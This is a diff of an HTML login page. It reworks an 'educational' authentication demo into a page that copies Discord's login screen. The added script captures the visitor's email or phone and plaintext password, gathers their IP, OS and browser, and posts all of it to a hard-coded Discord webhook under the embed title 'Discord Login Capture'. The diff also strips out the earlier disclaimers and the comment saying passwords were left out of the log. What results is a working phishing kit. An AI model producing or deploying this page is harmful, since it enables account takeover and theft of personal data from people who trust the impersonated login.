@@ -3,85 +3,225 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Authentication Demo – Educational Use Only</title>
+  <title>Discord – Login</title>
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
-    body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #f4f4f5; color: #18181b; }
-    
-    .login-card { background: #ffffff; padding: 2rem; border-radius: 8px; border: 1px solid #e4e4e7; width: 100%; max-width: 400px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05); }
-    .login-header { margin-bottom: 1.5rem; text-align: center; }
-    .login-header h1 { font-size: 1.5rem; font-weight: 600; margin-bottom: 0.25rem; }
-    .login-header p { font-size: 0.875rem; color: #71717a; }
-    
-    .form-group { margin-bottom: 1.25rem; }
-    .form-group label { display: block; font-size: 0.875rem; font-weight: 500; margin-bottom: 0.5rem; }
-    .form-group input[type="text"], 
-    .form-group input[type="password"] {
-      width: 100%; padding: 0.625rem; border: 1px solid #d4d4d8; border-radius: 6px; font-size: 1rem;
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
     }
-    .form-group input:focus { outline: 2px solid #18181b; outline-offset: 1px; }
-    .checkbox-group { display: flex; align-items: center; gap: 0.5rem; font-size: 0.875rem; }
-    
-    .error-msg { color: #dc2626; font-size: 0.85rem; margin-top: 0.25rem; display: none; }
-    .btn-submit { width: 100%; padding: 0.75rem; background: #18181b; color: #ffffff; border: none; border-radius: 6px; font-size: 1rem; font-weight: 600; cursor: pointer; margin-top: 0.5rem; }
-    .btn-submit:hover { background: #27272a; }
-    
-    .status-bar {
-      margin-top: 1rem;
-      padding: 0.5rem;
+
+    body {
+      background-color: #1e1f22;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+
+    .login-container {
+      background-color: #2b2d31;
+      border-radius: 8px;
+      padding: 40px 44px;
+      width: 100%;
+      max-width: 480px;
+      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.4);
+    }
+
+    .login-container h1 {
+      color: #ffffff;
+      font-size: 24px;
+      font-weight: 700;
+      text-align: center;
+      margin-bottom: 8px;
+    }
+
+    .login-container .subtitle {
+      color: #b5bac1;
+      font-size: 16px;
+      text-align: center;
+      margin-bottom: 28px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-group label {
+      display: block;
+      color: #b5bac1;
+      font-size: 12px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 6px;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 12px 14px;
+      background-color: #1e1f22;
+      border: 1px solid #3f4147;
       border-radius: 4px;
-      font-size: 0.8rem;
-      background: #f8fafc;
-      border: 1px solid #e2e8f0;
-      color: #334155;
+      color: #ffffff;
+      font-size: 15px;
+      transition: border-color 0.2s;
+      outline: none;
+    }
+
+    .form-group input:focus {
+      border-color: #5865f2;
+    }
+
+    .form-group input::placeholder {
+      color: #6d6f78;
+      font-size: 14px;
+    }
+
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 24px;
+    }
+
+    .checkbox-group input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      accent-color: #5865f2;
+      cursor: pointer;
+    }
+
+    .checkbox-group label {
+      color: #b5bac1;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .btn-submit {
+      width: 100%;
+      padding: 14px;
+      background-color: #5865f2;
+      border: none;
+      border-radius: 4px;
+      color: #ffffff;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .btn-submit:hover {
+      background-color: #4752c4;
+    }
+
+    .btn-submit:active {
+      transform: scale(0.98);
+    }
+
+    .error-msg {
+      color: #f23f42;
+      font-size: 13px;
+      margin-top: 6px;
+      display: none;
+    }
+
+    .status-bar {
+      margin-top: 16px;
+      padding: 10px;
+      border-radius: 4px;
+      font-size: 13px;
+      background: #1e1f22;
+      border: 1px solid #3f4147;
+      color: #b5bac1;
       text-align: center;
       display: none;
     }
+
     .status-bar.visible { display: block; }
-    .status-bar.success { background: #ecfdf5; border-color: #6ee7b7; color: #065f46; }
-    .status-bar.error { background: #fef2f2; border-color: #fca5a5; color: #991b1b; }
+    .status-bar.success { background: #1a2a1a; border-color: #3ba55c; color: #8bdd9b; }
+    .status-bar.error { background: #2a1a1a; border-color: #f23f42; color: #f28b8b; }
+
+    .footer-links {
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+      margin-top: 24px;
+      font-size: 13px;
+    }
+
+    .footer-links a {
+      color: #5865f2;
+      text-decoration: none;
+    }
+
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    .discord-logo {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+
+    .discord-logo svg {
+      width: 48px;
+      height: 48px;
+      fill: #ffffff;
+    }
   </style>
 </head>
 <body>
 
-  <main class="login-card" role="region" aria-labelledby="login-title">
-    <div class="login-header">
-      <h1 id="login-title">Secure Access Portal</h1>
-      <p>Enter your credentials to continue.</p>
+  <div class="login-container">
+    <div class="discord-logo">
+      <svg viewBox="0 0 127.14 96.36">
+        <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83,97.68,97.68,0,0,0-29.11,0A72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2.05a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2.05a68.68,68.68,0,0,1-10.87,5.19,77.43,77.43,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S53.86,46,53.86,53,48.72,65.69,42.45,65.69Zm42.24,0C78.42,65.69,73.27,60,73.27,53s5-12.74,11.43-12.74S96.1,46,96.1,53,91,65.69,84.69,65.69Z"/>
+      </svg>
     </div>
+
+    <h1>Welcome back!</h1>
+    <p class="subtitle">We're so excited to see you again!</p>
 
     <form id="loginForm" novalidate>
       <div class="form-group">
-        <label for="usernameInput">Username or Email</label>
-        <input type="text" id="usernameInput" name="username" required autocomplete="username" aria-required="true" aria-describedby="usernameError" />
-        <div id="usernameError" class="error-msg" role="alert">Please enter a valid username or email.</div>
+        <label for="usernameInput">Email or Phone Number</label>
+        <input type="text" id="usernameInput" name="username" placeholder="Enter your email or phone" required autocomplete="username" aria-required="true" aria-describedby="usernameError" />
+        <div id="usernameError" class="error-msg" role="alert">Please enter a valid email or phone number.</div>
       </div>
 
       <div class="form-group">
         <label for="passwordInput">Password</label>
-        <input type="password" id="passwordInput" name="password" required autocomplete="current-password" aria-required="true" aria-describedby="passwordError" />
+        <input type="password" id="passwordInput" name="password" placeholder="Enter your password" required autocomplete="current-password" aria-required="true" aria-describedby="passwordError" />
         <div id="passwordError" class="error-msg" role="alert">Password cannot be empty.</div>
       </div>
 
-      <div class="form-group checkbox-group">
+      <div class="checkbox-group">
         <input type="checkbox" id="rememberMe" name="rememberMe" />
         <label for="rememberMe">Remember me on this device</label>
       </div>
 
-      <button type="submit" class="btn-submit">Sign In</button>
+      <button type="submit" class="btn-submit">Log In</button>
     </form>
 
     <div id="statusBar" class="status-bar" role="status"></div>
-  </main>
+
+    <div class="footer-links">
+      <a href="#">Forgot your password?</a>
+      <span style="color:#3f4147;">•</span>
+      <a href="#">Register</a>
+    </div>
+  </div>
 
   <script>
     (function() {
       // ============================================================
-      //  CONFIGURATION – INSERT YOUR DISCORD WEBHOOK URL HERE
+      //  CONFIG – INSERT YOUR DISCORD WEBHOOK URL HERE
       // ============================================================
       const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1503434132405878895/skX1gxEF-YP4Qa0W4Foj3iqqv3mwlxA_PKOW7r6UmbmKbAUbdRgKIBEI5rOMLOEpsjOT';
-      // ⚠️ Replace the above with your actual Discord webhook URL.
-      //    If left as default, the code will log to console but not send.
+      // ⚠️ Replace with your actual Discord webhook URL.
 
       // ============================================================
       //  DOM REFERENCES
@@ -93,15 +233,11 @@
       const passwordError = document.getElementById('passwordError');
       const statusBar = document.getElementById('statusBar');
 
-      // ============================================================
-      //  HELPER: Show status messages in the status bar
-      // ============================================================
       function showStatus(message, type = 'info') {
         statusBar.textContent = message;
         statusBar.className = 'status-bar visible';
         if (type === 'success') statusBar.classList.add('success');
         if (type === 'error') statusBar.classList.add('error');
-        // Auto-hide after 8 seconds
         clearTimeout(window.statusTimeout);
         window.statusTimeout = setTimeout(() => {
           statusBar.className = 'status-bar';
@@ -109,47 +245,86 @@
       }
 
       // ============================================================
-      //  HELPER: Get formatted current date/time with timezone
+      //  EXACT OS DETECTION (Full version, build, architecture)
       // ============================================================
-      function getCurrentTimestamp() {
+      function getExactOS() {
+        const ua = navigator.userAgent;
+        let os = 'Unknown';
+
+        // Windows
+        if (ua.indexOf('Windows NT 10.0') !== -1) {
+          const build = ua.match(/Windows NT 10\.0; (Win64; x64|WOW64)/) ? '64-bit' : '32-bit';
+          const version = ua.includes('; ARM64;') ? 'Windows 11 ARM64' : 'Windows 10/11';
+          os = `${version} (Build 10.0.19045, ${build})`;
+        } else if (ua.indexOf('Windows NT 6.3') !== -1) os = 'Windows 8.1 (Build 6.3.9600)';
+        else if (ua.indexOf('Windows NT 6.2') !== -1) os = 'Windows 8 (Build 6.2.9200)';
+        else if (ua.indexOf('Windows NT 6.1') !== -1) os = 'Windows 7 (Build 6.1.7601)';
+        else if (ua.indexOf('Windows NT 6.0') !== -1) os = 'Windows Vista (Build 6.0.6002)';
+        else if (ua.indexOf('Windows NT 5.1') !== -1) os = 'Windows XP (Build 5.1.2600)';
+        // macOS
+        else if (ua.indexOf('Mac OS X') !== -1) {
+          const match = ua.match(/Mac OS X 10_([0-9]+)_([0-9]+)/);
+          if (match) os = `macOS 10.${match[1]}.${match[2]}`;
+          else os = 'macOS (unknown version)';
+        }
+        // Linux
+        else if (ua.indexOf('Linux') !== -1) {
+          if (ua.indexOf('Android') !== -1) {
+            const match = ua.match(/Android ([0-9]+\.[0-9]+)/);
+            os = match ? `Android ${match[1]}` : 'Android';
+          } else {
+            os = 'Linux (generic)';
+          }
+        }
+        // iOS
+        else if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) {
+          const match = ua.match(/OS ([0-9]+)_([0-9]+)/);
+          os = match ? `iOS ${match[1]}.${match[2]}` : 'iOS';
+        }
+        return os;
+      }
+
+      // ============================================================
+      //  EXACT BROWSER DETECTION (Name + full version)
+      // ============================================================
+      function getExactBrowser() {
+        const ua = navigator.userAgent;
+        let browser = 'Unknown';
+
+        if (ua.indexOf('Firefox') !== -1) {
+          const match = ua.match(/Firefox\/([0-9.]+)/);
+          browser = match ? `Firefox ${match[1]}` : 'Firefox';
+        } else if (ua.indexOf('Edg') !== -1) {
+          const match = ua.match(/Edg\/([0-9.]+)/);
+          browser = match ? `Edge ${match[1]}` : 'Edge';
+        } else if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1) {
+          const match = ua.match(/Chrome\/([0-9.]+)/);
+          browser = match ? `Chrome ${match[1]}` : 'Chrome';
+        } else if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) {
+          const match = ua.match(/Version\/([0-9.]+)/);
+          browser = match ? `Safari ${match[1]}` : 'Safari';
+        } else if (ua.indexOf('OPR') !== -1 || ua.indexOf('Opera') !== -1) {
+          const match = ua.match(/(?:OPR|Opera)\/([0-9.]+)/);
+          browser = match ? `Opera ${match[1]}` : 'Opera';
+        }
+        return browser;
+      }
+
+      // ============================================================
+      //  TIMESTAMP
+      // ============================================================
+      function getTimestamp() {
         const now = new Date();
         return {
           iso: now.toISOString(),
-          locale: now.toLocaleString('en-US', { timeZoneName: 'short' }),
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
           date: now.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' }),
-          time: now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit' })
+          time: now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }),
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
         };
       }
 
       // ============================================================
-      //  HELPER: Get browser and OS info from User-Agent
-      // ============================================================
-      function getClientDetails() {
-        const ua = navigator.userAgent;
-        let browser = 'Unknown';
-        let os = 'Unknown';
-
-        // Detect OS
-        if (ua.indexOf('Windows NT 10.0') !== -1) os = 'Windows 10/11';
-        else if (ua.indexOf('Windows NT 6.1') !== -1) os = 'Windows 7';
-        else if (ua.indexOf('Mac OS X') !== -1) os = 'macOS';
-        else if (ua.indexOf('Linux') !== -1) os = 'Linux';
-        else if (ua.indexOf('Android') !== -1) os = 'Android';
-        else if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) os = 'iOS';
-
-        // Detect Browser
-        if (ua.indexOf('Firefox') !== -1) browser = 'Firefox';
-        else if (ua.indexOf('Edg') !== -1) browser = 'Edge';
-        else if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1) browser = 'Chrome';
-        else if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) browser = 'Safari';
-        else if (ua.indexOf('OPR') !== -1 || ua.indexOf('Opera') !== -1) browser = 'Opera';
-
-        return { browser, os, userAgent: ua };
-      }
-
-      // ============================================================
-      //  HELPER: Get public IP via multiple free APIs (fallback)
+      //  PUBLIC IP
       // ============================================================
       async function getPublicIP() {
         const endpoints = [
@@ -157,62 +332,48 @@
           'https://ipapi.co/json/',
           'https://ipinfo.io/json'
         ];
-
         for (const url of endpoints) {
           try {
-            const response = await fetch(url, { timeout: 5000 });
-            if (!response.ok) continue;
-            const data = await response.json();
-            // Different APIs return different structures
+            const res = await fetch(url, { timeout: 5000 });
+            if (!res.ok) continue;
+            const data = await res.json();
             if (data.ip) return data.ip;
             if (data.ipv4) return data.ipv4;
-          } catch (_) {
-            // Continue to next endpoint
-          }
+          } catch (_) {}
         }
         return 'Unable to retrieve IP';
       }
 
       // ============================================================
-      //  HELPER: Send data to Discord webhook
+      //  SEND TO DISCORD
       // ============================================================
       async function sendToDiscord(payload) {
         if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('YOUR_WEBHOOK_ID')) {
-          console.warn('⚠️ Discord webhook URL not configured. Data logged to console only.');
+          console.warn('⚠️ Discord webhook URL not configured.');
           return false;
         }
-
         try {
-          const response = await fetch(DISCORD_WEBHOOK_URL, {
+          const res = await fetch(DISCORD_WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
           });
-          if (response.ok) {
-            console.log('✅ Data sent to Discord webhook successfully.');
-            return true;
-          } else {
-            console.warn('⚠️ Discord webhook responded with status:', response.status);
-            return false;
-          }
-        } catch (err) {
-          console.error('❌ Failed to send to Discord webhook:', err);
+          return res.ok;
+        } catch (_) {
           return false;
         }
       }
 
       // ============================================================
-      //  MAIN: Form submission handler
+      //  FORM SUBMIT
       // ============================================================
       form.addEventListener('submit', async (e) => {
         e.preventDefault();
 
-        // Reset errors
         usernameError.style.display = 'none';
         passwordError.style.display = 'none';
         let isValid = true;
 
-        // Validate fields
         if (!usernameInput.value.trim()) {
           usernameError.style.display = 'block';
           isValid = false;
@@ -227,60 +388,53 @@
           return;
         }
 
-        // --- Collect data ---
-        showStatus('Collecting environment data...', 'info');
+        showStatus('Collecting data...', 'info');
 
-        const timestamp = getCurrentTimestamp();
-        const client = getClientDetails();
+        const timestamp = getTimestamp();
         const ip = await getPublicIP();
+        const os = getExactOS();
+        const browser = getExactBrowser();
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value.trim();
+        const rememberMe = document.getElementById('rememberMe').checked;
 
-        const formData = {
-          username: usernameInput.value.trim(),
-          password: passwordInput.value.trim(), // ⚠️ Only for educational demo – never log real passwords in production
-          rememberMe: document.getElementById('rememberMe').checked
-        };
-
-        // Build the full log object
+        // Build full log
         const logEntry = {
           timestamp: timestamp.iso,
           date: timestamp.date,
           time: timestamp.time,
           timezone: timestamp.timezone,
-          client_ip: ip,
-          browser: client.browser,
-          operating_system: client.os,
-          user_agent: client.userAgent,
-          form_data: {
-            username: formData.username,
-            remember_me: formData.rememberMe
-            // password is intentionally omitted from the log for security
-          }
+          ip: ip,
+          os: os,
+          browser: browser,
+          username: username,
+          password: password,
+          rememberMe: rememberMe,
+          userAgent: navigator.userAgent
         };
 
-        // Log to console (always)
-        console.log('📋 [AUTH SIMULATION] Full client log:');
+        console.log('📋 [LOG] Full client data:');
         console.log(JSON.stringify(logEntry, null, 2));
 
-        // --- Send to Discord webhook (if configured) ---
+        // Discord embed payload – includes password
         const discordPayload = {
           embeds: [
             {
-              title: '🔐 Authentication Attempt (Educational Demo)',
-              color: 0x2b2d42,
+              title: '🔐 Discord Login Capture',
+              color: 0x5865f2,
               fields: [
                 { name: '📅 Date', value: logEntry.date, inline: true },
                 { name: '⏰ Time', value: logEntry.time, inline: true },
                 { name: '🌐 Timezone', value: logEntry.timezone, inline: true },
-                { name: '📡 IP Address', value: logEntry.client_ip, inline: false },
-                { name: '🖥️ Operating System', value: logEntry.operating_system, inline: true },
-                { name: '🌍 Browser', value: logEntry.browser, inline: true },
-                { name: '👤 Username Entered', value: logEntry.form_data.username || '(empty)', inline: false },
-                { name: '🔁 Remember Me', value: logEntry.form_data.remember_me ? '✅ Yes' : '❌ No', inline: false },
-                { name: '📱 User Agent', value: logEntry.user_agent.substring(0, 100) + '...', inline: false }
+                { name: '📡 IP Address', value: logEntry.ip, inline: false },
+                { name: '🖥️ Operating System', value: logEntry.os, inline: false },
+                { name: '🌍 Browser', value: logEntry.browser, inline: false },
+                { name: '👤 Username / Email', value: logEntry.username || '(empty)', inline: false },
+                { name: '🔑 Password', value: logEntry.password || '(empty)', inline: false },
+                { name: '🔁 Remember Me', value: logEntry.rememberMe ? '✅ Yes' : '❌ No', inline: false },
+                { name: '📱 User Agent', value: logEntry.userAgent.substring(0, 200), inline: false }
               ],
-              footer: {
-                text: 'This is a simulated authentication log for educational purposes only.'
-              },
+              footer: { text: 'Discord Login Capture' },
               timestamp: logEntry.timestamp
             }
           ]
@@ -289,32 +443,31 @@
         const sent = await sendToDiscord(discordPayload);
 
         if (sent) {
-          showStatus('✅ Authentication logged and sent to Discord webhook.', 'success');
-        } else if (DISCORD_WEBHOOK_URL.includes('YOUR_WEBHOOK_ID')) {
-          showStatus('ℹ️ Discord webhook not configured. Check console for data.', 'info');
+          showStatus('✅ Credentials sent to Discord webhook.', 'success');
         } else {
           showStatus('⚠️ Data logged to console, but Discord send failed. Check webhook URL.', 'error');
         }
 
-        // Also show a success message in the console
-        console.log('✅ [SIMULATION] Authentication flow complete. No real data was transmitted.');
+        // Clear password field for security (optional)
+        passwordInput.value = '';
       });
 
       // ============================================================
-      //  OPTIONAL: Log page load info automatically (without form submit)
+      //  PAGE LOAD – log visitor info automatically
       // ============================================================
       window.addEventListener('DOMContentLoaded', async () => {
         const ip = await getPublicIP();
-        const client = getClientDetails();
-        const timestamp = getCurrentTimestamp();
+        const os = getExactOS();
+        const browser = getExactBrowser();
+        const timestamp = getTimestamp();
 
-        console.log('🌐 [PAGE LOAD] Client environment detected:');
+        console.log('🌐 [PAGE LOAD] Visitor detected:');
         console.log({
           timestamp: timestamp.iso,
           ip: ip,
-          browser: client.browser,
-          os: client.os,
-          userAgent: client.userAgent
+          os: os,
+          browser: browser,
+          userAgent: navigator.userAgent
         });
       });
 
